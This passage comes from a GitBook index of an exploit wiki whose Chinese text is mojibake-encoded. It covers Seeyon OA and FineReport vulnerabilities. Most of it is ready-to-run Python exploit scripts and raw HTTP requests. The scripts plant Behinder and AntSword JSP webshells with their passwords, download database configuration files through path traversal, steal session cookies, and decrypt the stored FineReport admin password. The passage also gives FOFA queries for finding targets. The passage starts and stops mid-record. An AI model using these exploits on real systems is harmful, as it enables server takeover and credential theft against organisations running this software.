2FheA%C3%A4_%05%00%00 å†°è3 é»˜è®¤é©¬pass : rebeyond webshellåœ°å€: http://xxx.xxx.xxx.xxx/seeyon/apps_res/addressbook/images/config.jspx æˆåŠŸä¼šè¿”å› { \"message\":null, \"details\":null, \"code\":\"0436821967\" } å¤±è´¥ä¼šè¿”å› { \"message\": \"è¢«è¿«ä¸‹çº¿ï¼ŒåŸå› ï¼šä¸æœåŠ¡å™¨å¤±å»è¿æ¥\", \"code\": \"-1\", \"details\": null } ä¸Šä¼ åè¯·æ±‚webshellåœ°å€ï¼Œè®¿é—®è¿”å›å‡ºç°å¦‚ä¸‹å›¾åˆ™æˆåŠŸå†™å…¥ [!NOTE] è®¿é—®çŠ¶æ€ç ä¸º 200 æˆåŠŸ è®¿é—®çŠ¶æ€ç ä¸º 404 å¤±è´¥ ä½¿ç”¨å†°èè¿æ¥:rebeyond æ¼æ´åˆ©ç”¨POC [!NOTE] å•ä¸ªç›®æ ‡ import requests import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: è‡´è¿œOA å¤šä¸ªç‰ˆæœ¬ \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url_2 = target_url + \"/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip\" print('\\033[36m[o] æ­£åœ¨è¯·æ±‚: {}'.format(vuln_url_2)) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", } data = \"managerMethod=validate&arguments=%1F%C2%8B%08%00%00%00%00%00%00%00uTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28*%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%1D%C2%AD%C2%81%3C%26%C3%90%C3%89%C2%BCA%3FL%C2%93%C2%B2%C3%B3%C3%B0%13%C2%9E%C2%B9%C2%BB%C2%92%06%1E%C3%86%C2%B5%2F%3B1%C2%B9%C2%81YR%C2%B9%C3%9C%C2%98%C2%95%C2%96A%C3%A6%C2%8A%C3%82mKj%19%C2%8B%C2%9C%C2%A5%C3%8A%C2%82Y%5C%C2%AC%C2%B9%24%C2%80d%C2%9E%03%5E%C3%8F%C3%97D%29%5Cm%2C%1F%07%2F%C3%85Q%5CD%C2%B6%26%C3%B9%C2%90%C3%A8%15%C3%A0p%C3%A1%C2%86%2C%C3%9Ah%C3%83J%0A%C2%87%C3%8FN%C2%A4%5C%C2%B7DM%00%C3%91C%28b%C3%8E%C3%96%C2%84%C2%ABe%40%2C%C2%898%03%C3%A2%C2%B8%C2%825%3EYp%C2%96%26%0C%C3%A8%7B%C2%BAFq%C3%9A%C3%B0%C2%A6%C2%9F%5B%C3%BCJ%00K%C2%B5%C3%B8TFqmc%C2%93%C3%8BH*va%C3%B9%0F%C3%A0_%C2%BE%C3%99%C2%A2%1E%C2%BA%C3%A2%C2%A2%C2%B2L5q%C2%B9%C3%A1%C2%A3%24*%C2%A9e*7iq%C3%B4m3%60mC8%C2%83j2%C2%A3%3A7%C3%80%C2%96%C2%85e%C2%A8%18D%C2%99.%C3%8F%5B%C2%BD%C2%838%0E%28F%25%C2%89%C2%9B%C3%84%C3%A3%C2%95%01%C2%A0%C2%B4L%C3%A9-%3F%C2%B8Bc%C2%95%3A%C3%86%C3%86%C3%9Fse%00%C3%B8%C2%8DoW%01%C3%B2L%15K%C2%8B%0CZ%08%C2%8Fh%7C%2C4W%C2%B9%C2%B4l%C3%AD%C3%96D%C3%856%C3%81%C2%B9%7Dl%C2%B1eQJ7%C3%93%12%C2%ADI%C2%89%5D%02Ygz%1E%C2%9DL%C3%B6%C2%99%C3%A6%C2%B4%C3%8E%C3%BB%C3%996j%C2%BDU%40s%40%C3%B3w%C3%8F%5B%C2%A4%C2%84%C2%80%C3%A0%2B%14K%0Cg%C3%82%01.W%C2%89K%C2%80%C3%AF%C3%9CXd%1F%C3%B6%03%C3%BB%C2%B0%C2%A9%C2%B6%C2%86%C2%8D%C2%ADP%3Fo%0F%C3%92%C3%80B%C3%92%08p%C3%BA%C2%AD%C2%A9%01%12%C2%AE%C3%90T%0D%C3%8B%28%07%C2%B6%C3%A6%23%C2%A8I%C2%A9S%C2%9DG%7B%0E_%C2%9D6%C3%86%C3%B1%1B%C2%BD%26%10%C3%839%C2%A6uU%03%C2%97%28X%C2%9E%C2%AE%26%C2%AA%C2%BEA%C3%B2%21%0B%C3%974%06%C3%87%C3%9C%C3%87%1BT%C3%A6%C2%B6%09%C3%BC%23%C2%A7%C2%87u%C2%AC%1A%C2%A7%0BG%7E%C2%82%C2%AD%C3%8A%C2%8F%3F%C3%BC%19%C3%99%C2%BF%C3%BE%C2%99%C3%88%C2%95%C2%84d%C2%AD%C2%91O%C3%AB%7C%C2%81%C3%8AO%C3%96o%C3%B8%C3%9Ay%C3%A4%12%C2%9D%C2%A7%C3%B5%C2%89%C2%A1%18%24%C2%A0j%C3%B4%C3%9A%C3%BA%C3%94z%C2%8D_%C2%BF%C3%96F%C2%9E%C2%9E%C2%A9%1C%C3%84V%25%C2%9C%5D%C3%96%C2%A6%C3%B9X%C2%A4%C2%B2%28%60XMn%C3%90%18%C3%A6%C2%AE%C2%81o%C3%B4m%C2%BA%C3%97%C2%95%C2%85%12%C2%AAs%C2%9A%C3%97%C3%A2n%C2%977%C3%BD%C3%81%C2%A9x%1F%C3%A9%C3%84%C2%A6%C2%BD*%2FW%18%C2%98%3A%06%C3%BC%3E%C2%B79%C2%9D%3D%12%C3%BD%C3%AD%C2%8F%1C%C3%944%C2%9D%5E%C2%97%1Cc%C3%AAgBc%C2%A0%C3%B1%C3%83%C2%95%1B%29%C2%ACe%08%21%C2%8D%C2%8F%C3%BA%C2%A1%C2%97%C3%90X%C2%A4%C2%A0%0A%C2%9A%C2%9E%C3%9Es%C3%A3%1C%C2%8A%C3%BA%10%C3%92%C3%9A%C3%AE%C2%A6%C3%A3%C2%A6%27%01%C2%A7T%C2%8E9a%5DQgw%C3%A1%C2%B5h%C3%AB%C2%BA*%5C%7E%C3%BF%C3%B8%3E%C3%ADL%C2%9AG%7D%C2%82R%C3%90%C2%9F%C2%BCh%C3%B3o%C3%83%C2%99%07bH%07%1E%C3%9E%C3%AFv%C3%96%3FW%C3%AA%C3%BDw%C2%AA%5B%C2%B3%3B%C3%93%C3%9A%C2%B6L%C3%AF%0E%C3%98o%C3%AFI%7E%3AQ%C2%80f%09%3C%7C%C3%A9%1C%0F%C2%8B%C2%AF%C3%8F%1F%C2%97%C3%84%C3%87%7D%C3%93o%18%1C%C3%B5%3E%C2%82%C3%BF%C2%9F.%C3%80q%C3%AAQ%C3%87%7E%7C%C2%AF%C3%B7%21%25%C2%A0wb%C3%92%C3%8C%C3%89%10%60%C3%8A%C2%B2%C3%AC%3D%C2%BCv%7F%C3%90%25I%17%C3%A5k%7Dg%C2%97%C3%9C%C3%AB%C3%BE%C3%BD%2FheA%C3%A4_%05%00%00\" requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url_2, headers=headers, data=data, verify=False) test_webshell(target_url) def test_webshell(target_url): webshell_url = target_url + \"/seeyon/apps_res/addressbook/images/config.jspx\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=webshell_url, timeout=10, verify=False, headers=headers) print(\"\\033[32m[o] æ­£åœ¨è¯·æ±‚ : {}/seeyon/apps_res/addressbook/images/config.jspx\\033[0m\".format(target_url)) if response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {} æˆåŠŸä¸Šä¼  webshell : {}/seeyon/apps_res/addressbook/images/config.jspx\\033[0m\".format(target_url,target_url)) print(\"\\033[32m[o] webshellåœ°å€ï¼š{}/seeyon/apps_res/addressbook/images/config.jspx \\033[0m\".format(target_url)) print(\"\\033[32m[o] å†°è3é»˜è®¤é©¬ pass ï¼šrebeyond \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] ç›®æ ‡æ¼æ´æ— æ³•åˆ©ç”¨ï¼Œå†™å…¥å¤±è´¥ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ç›®æ ‡æ¼æ´æ— æ³•åˆ©ç”¨ï¼Œå†™å…¥å¤±è´¥ {} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) æ–‡ä»¶ç¼–ç è„šæœ¬, è‡ªè¡Œè¿›è¡Œè‡ªå®šä¹‰è°ƒè¯• PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-08 20:14:56 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/è‡´è¿œOA/è‡´è¿œOA webmail.doä»»æ„æ–‡ä»¶ä¸‹è½½ CNVD-2020-62422.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/è‡´è¿œOA/è‡´è¿œOA webmail.doä»»æ„æ–‡ä»¶ä¸‹è½½ CNVD-2020-62422.html","title":"è‡´è¿œOA webmail.doä»»æ„æ–‡ä»¶ä¸‹è½½ CNVD-2020-62422","keywords":"","body":"è‡´è¿œOA webmail.doä»»æ„æ–‡ä»¶ä¸‹è½½ CNVD-2020-62422 æ¼æ´æè¿° è‡´è¿œOAå­˜åœ¨ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´ä¸‹è½½ä»»æ„æ–‡ä»¶ï¼Œè·å–æ•æ„Ÿä¿¡æ¯ æ¼æ´å½±å“ [!NOTE] è‡´è¿œOA A6-V5 è‡´è¿œOA A8-V5 è‡´è¿œOA G6 æ¼æ´å¤ç° è®¿é—® url http://xxx.xxx.xxx.xxx/seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=../conf/datasourceCtp.properties å­˜åœ¨æ¼æ´çš„OA ç³»ç»Ÿå°†ä¼šä¸‹è½½ datasourceCtp.properties é…ç½®æ–‡ä»¶ æ›´æ”¹å‚æ•° filePath å¯ä¸‹è½½å…¶ä»–æ–‡ä»¶ æ¼æ´åˆ©ç”¨POC import requests import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: è‡´è¿œOAå¤šä¸ªç‰ˆæœ¬ \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=../conf/datasourceCtp.properties\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"workflow\" in response.text: print(\"\\033[32m[o] ç›®æ ‡{}å­˜åœ¨æ¼æ´ \\033[0m\".format(target_url)) print(\"\\033[32m[o] å“åº”ä¸º:\\n{} \\033[0m\".format(response.text)) else: print(\"\\033[31m[x] æ–‡ä»¶è¯·æ±‚å¤±è´¥ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] è‡´è¿œOA webmail.doä»»æ„æ–‡ä»¶ä¸‹è½½ CNVD-2020-62422 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-08 15:54:37 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/è‡´è¿œOA/è‡´è¿œOA Sessionæ³„éœ² ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/è‡´è¿œOA/è‡´è¿œOA Sessionæ³„éœ² ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´.html","title":"è‡´è¿œOA Sessionæ³„éœ² ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´","keywords":"","body":"è‡´è¿œOA Sessionæ³„éœ² ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ æ¼æ´æè¿° è‡´è¿œOAé€šè¿‡å‘é€ç‰¹æ®Šè¯·æ±‚è·å–sessionï¼Œåœ¨é€šè¿‡æ–‡ä»¶ä¸Šä¼ æ¥å£ä¸Šä¼ webshellæ§åˆ¶æœåŠ¡å™¨ æ¼æ´å½±å“ [!NOTE] è‡´è¿œOA FOFA [!NOTE] title=\"è‡´è¿œ\" æ¼æ´å¤ç° é¦–å…ˆè¦è·å–ç®¡ç†å‘˜cookie POST /seeyon/thirdpartyController.do HTTP/1.1 Host: xxx.xxx.xxx.xxx User-Agent: python-requests/2.25.1 Accept-Encoding: gzip, deflate Accept: */* Connection: close Content-Length: 133 Content-Type: application/x-www-form-urlencoded method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1 [!NOTE] è¿”å›åŒ…å‡ºç° Sset-Cookie å’Œ a8genius.do å³ä¸ºæˆåŠŸè·å– ä¸Šä¼ å‹ç¼©åŒ…æ·»åŠ  Cookieä¸Šä¼  POST /seeyon/fileUpload.do?method=processUpload HTTP/1.1 Host: xxx.xxx.xxx.xxx Connection: close Accept-Encoding: gzip, deflate Accept: */* User-Agent: python-requests/2.25.1 Cookie: JSESSIONID=3495C4DEF87200EA323B1CA31E3B7DF5 Content-Length: 841 Content-Type: multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b --59229605f98b8cf290a7b8908b34616b Content-Disposition: form-data; name=\"firstSave\" true --59229605f98b8cf290a7b8908b34616b Content-Disposition: form-data; name=\"callMethod\" resizeLayout --59229605f98b8cf290a7b8908b34616b Content-Disposition: form-data; name=\"isEncrypt\" 0 --59229605f98b8cf290a7b8908b34616b Content-Disposition: form-data; name=\"takeOver\" false --59229605f98b8cf290a7b8908b34616b Content-Disposition: form-data; name=\"type\" 0 --59229605f98b8cf290a7b8908b34616b Content-Disposition: form-data; name=\"file1\"; filename=\"test.png\" Content-Type: image/png PK....................______ --59229605f98b8cf290a7b8908b34616b-- ç„¶åæ„é€ è¯·æ±‚è§£å‹å‹ç¼©åŒ… POST /seeyon/ajax.do HTTP/1.1 Host: 192.168.10.2 User-Agent: python-requests/2.25.1 Accept-Encoding: gzip, deflate Accept: */* Connection: close Content-Type: application/x-www-form-urlencoded Cookie: JSESSIONID=BDF7358D4C35C6D2BB99FADFEE21F913 Content-Length: 157 method=ajaxAction&managerName=portalDesignerManager&managerMethod=uploadPageLayoutAttachment&arguments=%5B0%2C%222021-04-09%22%2C%225818374431215601542%22%5D çŠ¶æ€ç è¿”å›500å³ä¸ºä¸Šä¼ æˆåŠŸ æ¼æ´POC [!NOTE] è„šæœ¬åœ¨æ–‡ä»¶ç›®å½•çš„ POCä¸­ å…¶ä¸­å«æœ‰zipå‹ç¼©åŒ… shell.zip, å¦‚æœä¸Šä¼ å¤±è´¥æ›´æ”¹ä¸€ä¸‹æ–‡ä»¶å # coding: utf-8 import requests import sys import random import time import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: è‡´è¿œOA \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/seeyon/thirdpartyController.do\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", } data = \"method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) if response.status_code == 200 and \"a8genius.do\" in response.text and 'set-cookie' in str(response.headers).lower(): cookies = response.cookies cookies = requests.utils.dict_from_cookiejar(cookies) cookie = cookies['JSESSIONID'] targeturl = target_url + '/seeyon/fileUpload.do?method=processUpload' print(\"\\033[32m[o] ç›®æ ‡ {} æ­£åœ¨ä¸Šä¼ å‹ç¼©åŒ…æ–‡ä»¶.... \\n[o] Cookie: {} \\033[0m\".format(target_url, cookie)) files = [('file1', ('360icon.png', open('shell.zip', 'rb'), 'image/png'))] headers = {'Cookie':\"JSESSIONID=%s\" % cookie} data = {'callMethod': 'resizeLayout', 'firstSave': \"true\", 'takeOver':\"false\", \"type\": '0','isEncrypt': \"0\"} response = requests.post(url=targeturl,files=files,data=data, headers=headers,timeout=60,verify=False) reg = re.findall('fileurls=fileurls\\+\",\"\\+\\'(.+)\\'',response.text,re.I) if len(reg)==0: sys.exit(\"ä¸Šä¼ æ–‡ä»¶å¤±è´¥\") POC_2(target_url, cookie, reg, headers) else: print(\"\\033[31m[x] ç›®æ ‡ {} ä¸å­˜åœ¨æ¼æ´ \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] ç›®æ ‡ {} è¯·æ±‚å¤±è´¥ \\033[0m\".format(target_url),e) def POC_2(target_url, cookie, reg, headers): vuln_url = target_url + '/seeyon/ajax.do' datestr = time.strftime('%Y-%m-%d') post = 'method=ajaxAction&managerName=portalDesignerManager&managerMethod=uploadPageLayoutAttachment&arguments=%5B0%2C%22' + datestr + '%22%2C%22' + reg[0] + '%22%5D' headers['Content-Type']=\"application/x-www-form-urlencoded\" print(\"\\033[32m[o] ç›®æ ‡ {} æ­£åœ¨è§£å‹æ–‡ä»¶.... \\033[0m\".format(target_url)) try: response = requests.post(vuln_url, data=post,headers=headers,timeout=60,verify=False) if response.status_code == 500: print(\"\\033[32m[o] ç›®æ ‡ {} è§£å‹æ–‡ä»¶æˆåŠŸ.... \\033[0m\".format(target_url)) print(\"\\033[32m[o] é»˜è®¤Webshellåœ°å€: {}/seeyon/common/designer/pageLayout/test10086.jsp \\033[0m\".format(target_url)) print(\"\\033[32m[o] èšå‰‘å¯†ç : test \\033[0m\".format(target_url)) print(\"\\033[32m[o] å¦‚æœç›®æ ‡webshellæ— æ³•è®¿é—®ï¼Œè¯·æ›´æ¢ shell.zip ä¸­çš„æœ¨é©¬åç§° \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] ç›®æ ‡ {} ä¸å­˜åœ¨æ¼æ´ \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] ç›®æ ‡ {} è¯·æ±‚å¤±è´¥ \\033[0m\".format(target_url),e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-08 15:52:00 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/å¸†è½¯OA/":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/å¸†è½¯OA/","title":"å¸†è½¯OA","keywords":"","body":"å¸†è½¯æŠ¥è¡¨ å¸†è½¯æŠ¥è¡¨ v8.0 ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CNVD-2018-04757 å¸†è½¯ V9 ä»»æ„æ–‡ä»¶è¦†ç›–æ–‡ä»¶ä¸Šä¼  å¸†è½¯æŠ¥è¡¨ 2012 SSRFæ¼æ´ å¸†è½¯æŠ¥è¡¨ 2012 ä¿¡æ¯æ³„éœ²æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-01 08:55:13 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/å¸†è½¯OA/å¸†è½¯æŠ¥è¡¨ v8.0 ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CNVD-2018-04757.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/å¸†è½¯OA/å¸†è½¯æŠ¥è¡¨ v8.0 ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CNVD-2018-04757.html","title":"å¸†è½¯æŠ¥è¡¨ v8.0 ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CNVD-2018-04757","keywords":"","body":"å¸†è½¯æŠ¥è¡¨ v8.0 ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CNVD-2018-04757 æ¼æ´æè¿° FineReportæŠ¥è¡¨è½¯ä»¶æ˜¯ä¸€æ¬¾çº¯Javaç¼–å†™çš„ï¼Œé›†æ•°æ®å±•ç¤º(æŠ¥è¡¨)å’Œæ•°æ®å½•å…¥(è¡¨å•)åŠŸèƒ½äºä¸€èº«çš„ä¼ä¸šçº§webæŠ¥è¡¨å·¥å…·ã€‚ FineReport v8.0ç‰ˆæœ¬å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨æ¼æ´è¯»å–ç½‘ç«™ä»»æ„æ–‡ä»¶ã€‚ æ¼æ´å½±å“ [!NOTE] FineReport FOFA [!NOTE] body=\"isSupportForgetPwd\" æ¼æ´å¤ç° å‡ºç°æ¼æ´çš„æ–‡ä»¶ä¸º fr-applet-8.0.jar package com.fr.chart.web; import com.fr.base.FRContext; import com.fr.general.IOUtils; import com.fr.stable.CodeUtils; import com.fr.web.core.ActionNoSessionCMD; import com.fr.web.utils.WebUtils; import java.io.InputStream; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; public class ChartGetFileContentAction extends ActionNoSessionCMD { public ChartGetFileContentAction() { } public void actionCMD(HttpServletRequest var1, HttpServletResponse var2, String var3) throws Exception { String var4 = CodeUtils.cjkDecode(WebUtils.getHTTPRequestParameter(var1, \"resourcepath\")); if (!WebUtils.invalidResourcePath(var4)) { InputStream var5 = FRContext.getCurrentEnv().readResource(var4); String var6 = IOUtils.inputStream2String(var5); var6 = var6.replace('\\ufeff', ' '); WebUtils.printAsString(var2, var6); } } public String getCMD() { return \"get_geo_json\"; } } ä½¿ç”¨requestå°†æ–‡ä»¶åä¼ å…¥ è°ƒç”¨cjkDecodeå‡½æ•°è§£å¯†æ–‡ä»¶å ä½¿ç”¨invalidResourcePathå‡½æ•°æ ¡éªŒæ–‡ä»¶æ˜¯å¦å­˜åœ¨ æœ€åä½¿ç”¨readResourceå‡½æ•°è¯»å–æ–‡ä»¶ä¼ è¾“åˆ°æµè§ˆå™¨ä¸Š é»˜è®¤ç›®å½•ä¸ºresources å…¶ä¸­çš„privilege.xmlé‡Œé¢å­˜å‚¨äº†åå°çš„ç”¨æˆ·åå¯†ç  [!NOTE] åŠ å¯†å‡½æ•° public static String passwordEncode(String var0) { StringBuilder var1 = new StringBuilder(); var1.append(\"___\"); if (var0 == null) { return var1.toString(); } else { int var2 = 0; for(int var3 = 0; var3 [!NOTE] è§£å¯†å‡½æ•° public static String passwordDecode(String var0) { if (var0 != null && var0.startsWith(\"___\")) { var0 = var0.substring(3); StringBuilder var1 = new StringBuilder(); int var2 = 0; for(int var3 = 0; var3 ä½¿ç”¨pythonå†™å‡ºçš„è§£å¯†ä»£ç ä¸º cipher = 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' #å¯†æ–‡ PASSWORD_MASK_ARRAY = [19, 78, 10, 15, 100, 213, 43, 23] #æ©ç  Password = \"\" cipher = cipher[3:] #æˆªæ–­ä¸‰ä½å for i in range(int(len(cipher) / 4)): c1 = int(\"0x\" + cipher[i * 4:(i + 1) * 4], 16) c2 = c1 ^ PASSWORD_MASK_ARRAY[i % 8] Password = Password + chr(c2) print (Password) è¿™é‡Œä½¿ç”¨ä¸Šé¢è®²è¿°çš„åŸç†è¿›è¡Œå¤ç°,è®¿é—®ç›®æ ‡ [!NOTE] è·¯å¾„åˆ†ä¸ºä¸¤ç§ /WebReport/ReportServer ReportServer è®¿é—®POCä¸º,è¯»å–å¯†ç æ–‡ä»¶ privilege.xml /WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml ä½¿ç”¨è§£å¯†è„šæœ¬è§£å¯†æ–‡ä»¶ å¾—åˆ°å¯†ç ï¼Œå³å¯ç™»é™†åå°ç³»ç»Ÿï¼Œè´¦æˆ·ä¸º admin æ¼æ´åˆ©ç”¨POC import requests import sys import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: å¸†è½¯æŠ¥è¡¨ v8.0 \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def decode_passwd(cipher): PASSWORD_MASK_ARRAY = [19, 78, 10, 15, 100, 213, 43, 23] # æ©ç  Password = \"\" cipher = cipher[3:] # æˆªæ–­ä¸‰ä½å for i in range(int(len(cipher) / 4)): c1 = int(\"0x\" + cipher[i * 4:(i + 1) * 4], 16) c2 = c1 ^ PASSWORD_MASK_ARRAY[i % 8] Password = Password + chr(c2) return Password def POC_1(target_url): vuln_url_1 = target_url + '/WebReport/ReportServer' vuln_url_2 = target_url + '/ReportServer' headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response_1 = requests.get(url=vuln_url_1, timeout=5, verify=False, headers=headers) response_2 = requests.get(url=vuln_url_2, timeout=5, verify=False, headers=headers) if \"éƒ¨ç½²é¡µé¢\" in response_1.text: print(\"\\033[32m[o] ç›®æ ‡éƒ¨ç½²é¡µé¢ä¸º: {} \\033[0m\".format(vuln_url_1)) POC_2(vuln_url_1) elif \"éƒ¨ç½²é¡µé¢\" in response_2.text: print(\"\\033[32m[o] ç›®æ ‡éƒ¨ç½²é¡µé¢ä¸º: {} \\033[0m\".format(vuln_url_2)) POC_2(vuln_url_2) else: print(\"\\033[31m[x] ç›®æ ‡æ¼æ´æ— æ³•åˆ©ç”¨ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ç›®æ ‡æ¼æ´æ— æ³•åˆ©ç”¨ {} \\033[0m\".format(e)) sys.exit(0) def POC_2(vuln_url_fileread): vuln_url = vuln_url_fileread + \"?op=chart&cmd=get_geo_json&resourcepath=privilege.xml\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, verify=False, timeout=5) print(\"\\033[32m[o] æ­£åœ¨è®¿é—®: {} \\033[0m\".format(vuln_url)) if \"rootManagerPassword\" in response.text and response.status_code == 200: 